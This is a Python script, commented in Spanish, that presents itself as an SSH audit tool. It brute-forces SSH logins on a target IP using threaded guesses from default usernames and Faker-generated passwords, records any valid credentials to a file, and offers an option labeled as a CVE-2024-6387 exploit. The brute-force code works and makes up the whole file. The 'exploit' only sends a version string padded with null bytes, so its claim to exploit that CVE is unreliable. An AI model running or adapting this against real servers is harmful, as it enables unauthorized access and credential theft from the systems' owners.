import paramiko
import threading
import queue
import time
import socket
import random
import argparse
from faker import Faker

fake = Faker()
q = queue.Queue()
found = threading.Event()
lock = threading.Lock()

DEFAULT_USERS = ["root", "admin", "ubuntu", "pi", "user", "test"]

def generate_dynamic_passwords(count=1000):
    passwords = ["password", "123456", "admin123", "qwerty", "toor", "letmein"]
    for _ in range(count):
        passwords.append(fake.password(length=random.randint(8, 12)))
        passwords.append(f"{fake.user_name()}{random.randint(1, 999)}")
        passwords.append(f"{fake.company().replace(' ', '')}{random.randint(2020, 2025)}")
    return list(set(passwords))

def try_ssh_login(ip, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=username, password=password, timeout=3)
        with lock:
            if not found.is_set():
                print(f"[+] Credencial válida encontrada: {username}:{password}")
                found.set()
                with open("valid_credentials.txt", "a") as f:
                    f.write(f"{ip}:{port} - {username}:{password}\n")
        return True
    except Exception:
        return False
    finally:
        client.close()

def worker(ip, port):
    while not q.empty() and not found.is_set():
        username, password = q.get()
        try_ssh_login(ip, port, username, password)
        q.task_done()

def scan_ssh_banner(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=3) as sock:
            sock.sendall(b"SSH-2.0-Auditor\n")
            banner = sock.recv(1024).decode().strip()
            print(f"[*] Banner SSH: {banner}")
            return banner
    except Exception:
        return None

def exploit_cve_2024_6387(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=3) as sock:
            payload = b"SSH-2.0-OpenSSH_8.9\n" + b"\x00" * 1000
            sock.sendall(payload)
            response = sock.recv(1024)
            print(f"[*] Respuesta CVE-2024-6387: {response.decode(errors='ignore')}")
            return True
    except Exception as e:
        print(f"[!] Error explotando CVE-2024-6387: {e}")
        return False

def main(ip, port=22, threads=10, user_file=None, pass_file=None, exploit=False):
    print(f"[*] Iniciando auditoría contra {ip}:{port} con {threads} hilos")
    
    banner = scan_ssh_banner(ip, port)
    if not banner:
        print("[!] No se pudo obtener el banner SSH.")
    
    if exploit:
        print("[*] Lanzando exploit CVE-2024-6387...")
        exploit_cve_2024_6387(ip, port)

    users = DEFAULT_USERS if not user_file else open(user_file).read().splitlines()
    passwords = generate_dynamic_passwords() if not pass_file else open(pass_file).read().splitlines()

    for user in users:
        for password in passwords:
            q.put((user, password))

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(ip, port))
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

    if not found.is_set():
        print("[!] No se encontraron credenciales válidas.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Auditoría SSH avanzada y prueba CVE-2024-6387")
    parser.add_argument("ip", help="Dirección IP del servidor objetivo")
    parser.add_argument("--port", type=int, default=22, help="Puerto SSH (por defecto 22)")
    parser.add_argument("--threads", type=int, default=10, help="Número de hilos")
    parser.add_argument("--users", help="Archivo con lista de usuarios")
    parser.add_argument("--passwords", help="Archivo con lista de contraseñas")
    parser.add_argument("--exploit", action="store_true", help="Intentar explotar CVE-2024-6387")
    args = parser.parse_args()
    
    main(args.ip, args.port, args.threads, args.users, args.passwords, args.exploit)
